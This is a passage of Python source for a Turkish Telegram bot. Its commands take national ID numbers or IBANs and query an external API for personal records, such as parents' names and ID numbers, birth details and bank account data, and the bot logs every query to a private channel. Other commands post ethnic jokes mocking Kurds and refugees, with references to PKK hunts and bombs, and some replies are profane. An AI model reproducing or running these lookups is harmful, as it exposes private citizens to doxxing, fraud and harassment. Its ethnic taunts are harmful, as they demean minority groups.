┃➥ DOĞUM TARİHİ: {dogumtarihi}
┃➥ İL: {nufusil}
┃➥ İLÇE: {nufusilce}
┃➥ ANNE ADI: {anneadi}
┃➥ ANNE TC: {annetc}
┃➥ BABA ADI: {babaadi}
┃➥ BABA TC: {babatc}
┃➥ UYRUK: {uyruk}
┃➥ YAKINLIK: {yakinlik}
{gsm_mesaj}
╰━━━━━━━━━━━━━━"""
                            cevap += info

                    file_name = f"Sonuçlar.txt"
                    with open(file_name, 'w', encoding='utf-8') as file:
                        file.write(cevap)

                    with open(file_name, 'rb') as file:
                        bot.send_document(message.chat.id, file)
                        bot.delete_message(message.chat.id, start_message.message_id)
                else:
                    bot.reply_to(message, "API'den başarısız yanıt alındı.")
            else:
                bot.reply_to(message, f"API'ye istek gönderirken bir hata oluştu. Durum Kodu: {response.status_code}")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekleyin




import requests

# Önceki fonksiyonları ve bot ayarlarınızı buraya ekleyin

@bot.message_handler(commands=["burc"])
def aile_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    start_message = bot.send_message(message.chat.id, "İşleminiz Gerçekleştiriliyor, Lütfen Bekleyin...")

    log_message = f"Yeni Aile Sorgu Atıldı!\n" \
                  f"Sorgulanan TC: {message.text.replace('/ailepro', '').strip()}\n" \
                  f"Sorgulayan ID: {message.from_user.id}\n" \
                  f"Sorgulayan Adı: {message.from_user.first_name}\n" \
                  f"Sorgulayan K. Adı: @{message.from_user.username}"
    bot.send_message(-1002017751874, log_message)

    mesaj = message.text

    if mesaj.startswith("/burc"):
        tc = mesaj.replace("/burc", "").strip()

        if tc.isdigit() and len(tc) == 11:
            api_url = f"http://172.208.52.218/api/legaliapi/burc.php?tc={tc}"
            response = requests.get(api_url)

            if response.status_code == 200:
                json_data = response.json()

                if json_data.get("success", False):
                    data = json_data.get("data", {})
                    burc = data.get("burc", "Bilgi Bulunamadı")
                    
                    response_message = f"Burcunuz: {burc}"
                    bot.send_message(message.chat.id, response_message)
                else:
                    bot.reply_to(message, "API'den başarısız yanıt alındı.")
            else:
                bot.reply_to(message, f"API'ye istek gönderirken bir hata oluştu. Durum Kodu: {response.status_code}")
        else:
            bot.reply_to(message, "Yanlış Formatlı TC. Kodu düzeltip tekrar deneyin.")

        bot.delete_message(message.chat.id, start_message.message_id)

# Diğer fonksiyonları ve bot ayarlarınızı buraya ekleyin




    


import requests
import os

import requests

@bot.message_handler(commands=['iban'])
def iban_sorgula(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    chat_id = message.chat.id
    user_input = message.text.split(' ', 1)

    if len(user_input) != 2:
        bot.send_message(chat_id, "Lütfen geçerli bir IBAN girin.")
        return

    iban = user_input[1]
    api_url = f'http://172.208.52.218/api/legaliapi/iban.php?iban={iban}'

    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        if 'Ad' in data and 'Kod' in data:
            banka_sube = {
                'Banka Adı': data['Ad'].strip('\"'),
                'Banka Kodu': data['Kod'].strip('\"'),
                'Swift': data['Swift'].strip('\"'),
                'Hesap No': data['Hesap No'].strip('\"'),
                'Şube Adı': data['Şube Adı'].strip('\"'),  
                'Şube Kodu': data['Şube Kodu'].strip('\"'),  
                'İl': data['İl'].strip('\"'),
                'İlçe': data['İlçe'].strip('\"'),
                'Tel': data['Tel'].strip('\"'),
                'Fax': data['Fax'].strip('\"')
            }

            response_message = (
                "╭━━━━━━━━━━━━━━━╮\n"
                "┃➥ Banka ve Şube Bilgileri\n"
                f"┃➥ Banka Adı: {banka_sube['Banka Adı']}\n"
                f"┃➥ Banka Kodu: {banka_sube['Banka Kodu']}\n"
                f"┃➥ Swift: {banka_sube['Swift']}\n"
                f"┃➥ Hesap No: {banka_sube['Hesap No']}\n"
                f"┃➥ Şube Adı: {banka_sube['Şube Adı']}\n"
                f"┃➥ Şube Kodu: {banka_sube['Şube Kodu']}\n"
                f"┃➥ İl: {banka_sube['İl']}\n"
                f"┃➥ İlçe: {banka_sube['İlçe']}\n"
                f"┃➥ Tel: {banka_sube['Tel']}\n"
                f"┃➥ Fax: {banka_sube['Fax']}\n"
                "╰━━━━━━━━━━━━━━━╯"
            )

            bot.send_message(chat_id, response_message)
            log_message = (
                f"Yeni IBAN Sorgu Atıldı!\n"
                f"Sorgulanan IBAN: {iban}\n"
                f"Sorgulayan ID: {user_id}\n"
                f"Sorgulayan Adı: {user_name}\n"
                f"Sorgulayan K. Adı: @{message.from_user.username}"
            )
            bot.send_message(-1002017751874, log_message)
        else:
            bot.send_message(chat_id, "╭─────📛─────╮\n│ Sonuç Bulunamadı\n╰────────────╯")
    else:
        bot.send_message(chat_id, "Veri alınırken bir hata oluştu.")


from fake_email import Email
from rich.console import Console

user_data = {}


@bot.message_handler(commands=["mail"])
def start_handler(message):
    user_id = message.from_user.id
    email_obj = Email() 
    email_bilgisi = email_obj.Mail()  
    user_data[user_id] = {
        "eposta": email_bilgisi["mail"],
        "session": email_bilgisi["session"]
    }
    eposta = user_data[user_id]["eposta"]
    gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
    
    bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
    bot.send_message(message.chat.id, bilgi)

    
    if gelen_mesajlar:
        bot.send_message(message.chat.id, "Yeni bir e-posta geldi!")


@bot.message_handler(commands=['refresh'])
def refresh_handler(message):
    user_id = message.from_user.id
    if user_id in user_data:
        eposta = user_data[user_id]["eposta"]
        gelen_mesajlar = Email(user_data[user_id]["session"]).inbox()
        bilgi = f"Eposta: {eposta}\nGelen Mesajlar: {gelen_mesajlar or 'Yeni mesaj yok'}"
        bot.send_message(message.chat.id, bilgi)
    else:
        bot.send_message(message.chat.id, "Önce /start komutunu kullanarak başlamalısınız.")

    import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests


def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ["member", "administrator"]
    except Exception as e:
        print(f"Hata: {e}")
        return False

import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests









@bot.message_handler(commands=['meme'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    # is_user_member fonksiyonunu tanımlayın ve kullanıcının üyelik durumunu kontrol edin
    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
    
    text = message.text.replace('/meme ', '')  

    try:
        # Local a.png dosyasından resmi yükle
        image = Image.open("a.png")

        draw = ImageDraw.Draw(image)

        position = (380, 380)  

        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()  # Font indirme hatası için kontrol ekliyoruz
        font = ImageFont.truetype(BytesIO(font_response.content), size=50)  

        draw.text(position, text, (160, 100, 50), font=font, spacing=10, align="center")  

        shadow_position = (position[0] + 1, position[1] + 1)  
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=10, align="center")  
        
        blurred_image = image.filter(ImageFilter.GaussianBlur(radius=1.8))

        # Buffer kullanmadan doğrudan resmi göndermek mümkün değil, dolayısıyla resmi kaydedip gönderiyoruz
        buffered = BytesIO()
        blurred_image.save(buffered, format="JPEG")  # JPEG formatında kaydediyoruz, çünkü Telegram JPEG formatını daha iyi destekliyor
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: {err}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: {e}")



@bot.message_handler(commands=['meme1'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    text = message.text.replace('/meme1 ', '')

    try:
        image = Image.open("c.png").convert('RGBA')

        # Load the font
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=55)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)

        # Define the text and shadow position
        position = (300, 460)
        shadow_position = (position[0] + 1, position[1] + 1)

        # Draw the shadow
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=20, align="center")

        # Draw the main text with the new color
        draw.text(position, text, (50, 50, 50), font=font, spacing=20, align="center")

        # Rotate the text image by 10 degrees to the left
        rotated_text_image = text_image.rotate(-13,resample=Image.BICUBIC, expand=1)

        # Create a new image to hold the combined result
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

        # Calculate the position to paste the rotated text image to center it correctly
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

        # Paste the rotated text image onto the combined image
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

        # Apply Gaussian blur
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.5))

        # Convert to RGB and save to buffer
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")
        



@bot.message_handler(commands=['meme2'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    text = message.text.replace('/meme2 ', '')

    try:
        image = Image.open("d.png").convert('RGBA')

        # Load the font
        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()
        font = ImageFont.truetype(BytesIO(font_response.content), size=46)

        # Create a new image for the text
        text_image = Image.new('RGBA', (image.width, image.height), (255, 255, 255, 0))
        draw = ImageDraw.Draw(text_image)

        # Define the text and shadow position
        position = (340, 820)
        shadow_position = (position[0] + 1, position[1] + 1)

        # Draw the shadow
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=100, align="center")

        # Draw the main text with the new color
        draw.text(position, text, (50, 50, 50), font=font, spacing=100, align="center")

        # Rotate the text image by 10 degrees to the left
        rotated_text_image = text_image.rotate(-7,resample=Image.BICUBIC, expand=1)

        # Create a new image to hold the combined result
        combined_image = Image.new('RGBA', image.size, (160, 100, 50))
        combined_image.paste(image, (0, 0))

        # Calculate the position to paste the rotated text image to center it correctly
        paste_position = (
            (image.width - rotated_text_image.width) // 2,
            (image.height - rotated_text_image.height) // 2
        )

        # Paste the rotated text image onto the combined image
        combined_image.paste(rotated_text_image, paste_position, rotated_text_image)

        # Apply Gaussian blur
        blurred_image = combined_image.filter(ImageFilter.GaussianBlur(radius=1.1))

        # Convert to RGB and save to buffer
        buffered = BytesIO()
        blurred_image.convert('RGB').save(buffered, format="JPEG")
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: ")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: ")





@bot.message_handler(commands=['got'])
def add_text_to_image(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    # is_user_member fonksiyonunu tanımlayın ve kullanıcının üyelik durumunu kontrol edin
    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return
    
    text = message.text.replace('/got ', '')  

    try:
        # Local /storage/emulated/0/b.png dosyasından resmi yükle
        image = Image.open("b.png")

        draw = ImageDraw.Draw(image)

        position = (490, 480)  

        font_url = "https://fonts.gstatic.com/s/indieflower/v21/m8JVjfNVeKWVnh3QMuKkFcZlbg.ttf"
        font_response = requests.get(font_url)
        font_response.raise_for_status()  # Font indirme hatası için kontrol ekliyoruz
        font = ImageFont.truetype(BytesIO(font_response.content), size=50)  

        draw.text(position, text, (160, 100, 50), font=font, spacing=10, align="center")  

        shadow_position = (position[0] + 1, position[1] + 1)  
        draw.text(shadow_position, text, (0, 0, 0), font=font, spacing=10, align="center")  
        
        blurred_image = image.filter(ImageFilter.GaussianBlur(radius=1.6))

        # Buffer kullanmadan doğrudan resmi göndermek mümkün değil, dolayısıyla resmi kaydedip gönderiyoruz
        buffered = BytesIO()
        blurred_image.save(buffered, format="JPEG")  # JPEG formatında kaydediyoruz, çünkü Telegram JPEG formatını daha iyi destekliyor
        buffered.seek(0)
        bot.send_photo(message.chat.id, photo=buffered)

    except requests.exceptions.HTTPError as err:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir HTTP hatası oluştu. Hata: {err}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Resim işleme sırasında bir hata oluştu. Hata: {e}")


# /türk komutuna yanıt ver
@bot.message_handler(commands=['turk'])
def send_random_percent(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Türk\'sün! Hewal, Gel dağa kaçak!'
    else:
        response = f'%{random_percent:.2f} Türk\'sün! Babayiğit, Gel PKK avına çıkalım!'
    bot.reply_to(message, response)

# /kürt komutuna yanıt ver
@bot.message_handler(commands=['kurt'])
def send_random_percent_kurt(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Kürt\'sün! Babayiğit, Ülken var!'
    else:
        response = f'%{random_percent:.2f} Kürt\'sün! Hewal, Bomba Geldi Kaç!'
    bot.reply_to(message, response)

# /mülteci komutuna yanıt ver
@bot.message_handler(commands=['multeci'])
def send_random_percent_multeci(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    # Rastgele bir oran üret
    random_percent = random.uniform(1, 100)
    if random_percent <= 50:
        response = f'%{random_percent:.2f} Mülteci\'sin! Babayiğit, Helal lan!'
    else:
        response = f'%{random_percent:.2f} Mülteci\'sin! Abi, Esat Bize bum bum!'
    bot.reply_to(message, response)





import os
from youtube_search import YoutubeSearch
from pytube import YouTube
import telebot


def is_user_member(user_id, chat_id):
    try:
        member = bot.get_chat_member(chat_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

@bot.message_handler(commands=['muzik'])
def download_music(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen müzik adı veya YouTube linki girin. Örnek kullanım: /muzik şarkı adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Müzik indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            audio_stream = yt.streams.filter(only_audio=True).first()
            if audio_stream:
                audio_path = audio_stream.download(output_path=".", filename=yt.title + ".mp3")

                with open(audio_path, 'rb') as audio:
                    bot.send_audio(message.chat.id, audio, caption=f"{yt.title}\n@TSGChecker")

                os.remove(audio_path)
            else:
                bot.reply_to(message, "Uygun bir ses akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Müzik indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Müzik bulunamadı veya YouTube arama sonucu boş.")

@bot.message_handler(commands=['video'])
def download_video(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    channel_id = -1002048770700
    group_id = -1002088355655

    if not is_user_member(user_id, channel_id) or not is_user_member(user_id, group_id):
        response = f"Merhaba {user_name}, ({user_id})!\n\nSorgular ücretsiz olduğu için kanala ve chate katılmanız zorunludur. Kanal ve chate katılıp tekrar deneyin.\n\nKanal: @TSGChecker\nChat: @TSGCheckerChat"
        bot.send_message(message.chat.id, response)
        return

    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "Lütfen video adı veya YouTube linki girin. Örnek kullanım: /video video adı")
        return

    try:
        results = YoutubeSearch(query, max_results=1).to_dict()
    except Exception as e:
        bot.reply_to(message, f"Arama sırasında hata oluştu: {e}")
        return

    if results and len(results) > 0:
        video_url = 'https://www.youtube.com' + results[0]['url_suffix']
        bot.reply_to(message, f"Video indiriliyor: {video_url}")

        try:
            yt = YouTube(video_url)
            if yt.age_restricted:
                bot.reply_to(message, "Bu video yaş sınırlamalı ve indirilemiyor. Lütfen başka bir video seçin.")
                return

            video_stream = yt.streams.filter(progressive=True, file_extension='mp4').first()
            if video_stream:
                video_path = video_stream.download(output_path=".", filename=yt.title + ".mp4")

                with open(video_path, 'rb') as video:
                    bot.send_video(message.chat.id, video, caption=f"{yt.title}\n@TSGChecker", supports_streaming=True)

                os.remove(video_path)
            else:
                bot.reply_to(message, "Uygun bir video akışı bulunamadı.")
        except Exception as e:
            bot.reply_to(message, f"Video indirilemedi. Hata: {e}")
    else:
        bot.reply_to(message, "Video bulunamadı veya YouTube arama sonucu boş.")

# Botun çalışması için komutlar



@bot.message_handler(commands=['cm'])
def send_random_number(message):
    random_number = random.randint(1, 40)
    bot.reply_to(message, f"ÇAVUŞUN BOYU: {random_number} cm")

@bot.message_handler(commands=['toplam'])
def toplam(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Toplam {len(users)} tane.")

@bot.message_handler(commands=['broadcast'])
def brd(message):
  save_user(message.from_user.id)
  t = Thread(target=broadcast, args=(message,))
  t.start();
  
def broadcast(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Başlatılıyor... (Toplam {len(users)})")
  for user in users:
    try:
      bot.send_message(user, " ".join(message.text.split()[1:]), disable_web_page_preview=True)
      time.sleep(1)
    except Exception as e:
      bot.reply_to(message, f"**{user} kullanıcısına gönderilemedi.** \n\n `{e}`", parse_mode="Markdown")
      time.sleep(1)
  bot.reply_to(message, "Gönderim tamamlandı!")

@bot.message_handler(commands=['puan'])
def puan(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Bu komutu kullanmaya yetkiniz yok.')
        return
    
    try:
        s = message.text.split()
        if len(s) < 3:
            return bot.reply_to(message, "Kullanım: /puan <kullanıcı_id> <puan>")
        
        id = str(s[1])
        puan = int(s[2])
        user_balances[id] = puan
        save_balances()
        bot.reply_to(message, f"{id} kullanıcısının puanı {puan} olarak değiştirildi.")
    except ValueError:
        bot.reply_to(message, "Geçersiz puan değeri. Lütfen bir sayı girin.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

  
@bot.message_handler(commands=['kaldir'])
def unblock_user(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ananı sikerim yetkin olmadığı şeye dokunma.')
        return

    try:
        parts = message.text.split()
        target_id = parts[1]
    except IndexError:
        bot.reply_to(message, 'anasini sikmek istediğini kişinin ID\'si gir. böyle kullan oc: /kaldir <kullanıcı_id>')
        return

    if target_id in last_message_times:
        del last_message_times[target_id]
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli kaldırıldı.')
    else:
        bot.reply_to(message, f'{target_id} kimlikli kullanıcının engeli bulunmuyor.')
        
@bot.message_handler(commands=['bakiye'])
def check_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /kumar Mesajını atın.')
        return

    bot.reply_to(message, f"Güncel bakiyeniz: {user_balances[user_id]} TL")
        
@bot.message_handler(commands=['risk'])
def risk_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if check_flood(user_id):
        bot.reply_to(message, "5 Saniye bekle tekrar at.")
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz, öncelikle bota /start mesajını atın.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Risk Alıp Bakiye kazan\nKullanım: /risk <miktar>')
        return

    try:
        
        risk_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, 'geçerli bir risk miktarı gir Kullanım: /risk <miktar>')
        return

    if risk_amount <= 0:
        bot.reply_to(message, 'Risk miktarı sayı olmalı.')
        return

    if user_balances[user_id] < risk_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. Mevcut bakiyeniz: {user_balances[user_id]} TL')
        return

    if random.random() < 0.6:  
        winnings = risk_amount * 2
        user_balances[user_id] += winnings - risk_amount  
        bot.reply_to(message, f'Tebrikler  {winnings} TL kazandınız.\nYeni bakiyeniz: {user_balances[user_id]} TL')
    else:
        user_balances[user_id] -= risk_amount
        bot.reply_to(message, f'Üzgünüm {risk_amount} TL kaybettiniz.\nbakiyeniz: {user_balances[user_id]} TL')

        save_balances()



@bot.message_handler(commands=['kumar'])
def start(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, 'Flood yapma 5 saniye bekle.')
        return
    log_message(user_id)

    if user_id not in user_balances:
        user_balances[user_id] = 25000 
        save_balances()  
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("Kurucu ❤️‍🩹", url="https://t.me/TSGxYUNUS")
    button2 = types.InlineKeyboardButton("Kanal 😍", url="https://t.me/TSGChecker")
    button3 = types.InlineKeyboardButton("Beni Gruba Ekle💫", url="https://t.me/Tsgoyun_Bot?startgroup=new")
    markup.add(button1, button2, button3)
    bot.reply_to(message, "👋 Merhaba botumuza hoşgeldin ilk defa başlattıyorsan 25000 TL bakiye başlangıç hediyesi olarak verilir İyi oyunlar. Komutlar İcin /yardim", reply_markup=markup)

@bot.message_handler(commands=['borc'])
def send_balance_to_friend(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 Saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    try:
        parts = message.text.split()
        friend_id = parts[1]
        amount = int(parts[2])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Geçerli bir miktar girin Kullanım: /borc <kullanıcı_id> <miktar>')
        return

    if amount <= 0:
        bot.reply_to(message, 'Sayı girin')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    if user_balances[user_id] < amount:
        bot.reply_to(message, 'Yeterli bakiyeniz yok.')
        return

    if friend_id not in user_balances:
        user_balances[friend_id] = 0

    user_balances[user_id] -= amount
    user_balances[friend_id] += amount
    save_balances()

    bot.reply_to(message, f'Başarılı! {friend_id} kimlikli kullanıcıya {amount} TL bakiye gönderildi.')
    
def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

@bot.message_handler(commands=['zenginler'])
def show_leaderboard(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return

    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "👑 En İyi 10 Zengin:\n\n"
    for i, (user_id, balance) in enumerate(sorted_balances[:10], start=1):
        try:
          user = bot.get_chat(user_id)
          user_name = user.first_name if user.first_name else "Bilinmiyor"
          leaderboard_message += f"{i-1}. {user_name} ⇒ {balance} TL\n"
        except:
          no_have_a = "problem"

    bot.reply_to(message, leaderboard_message)
    
@bot.message_handler(commands=['yardim'])
def send_help_message(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 saniye bekle tekrar dene.")
        return
    user_last_message_time[user_id] = current_time

    help_message = """
    ⭐ Hey dostum aşağıdaki komutları kullanabilirsin

/slot [miktar]: 🎰 Slot oyununu oynamak için bahis yapın.

/kelime: 🔢 Kelime Tahmin Oyununu Oynayarak 1500 tl Kazan.

/bakiye: 💰 Mevcut bakiyenizi kontrol edin.

/risk: Risk oyunu oynayıp bakiye kazanabilirsiniz.

/borc [Kullanıcı İd] [miktar]: 💸 Başka bir kullanıcıya bakiye göndermesi yapın.

/zenginler: 🏆 Genel Sıralamayı gösterir.

/yardim: ℹ️ Bu yardım mesajını görüntüleyin.
    """
def ip_sorgula(ip_adresi):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_adresi}')
        data = response.json()
        country = data['country']
        city = data['city']
        region = data['regionName']
        isp = data['isp']
        latitude = data['lat']
        longitude = data['lon']
        timezone = data['timezone']
        zip_code = data['zip']
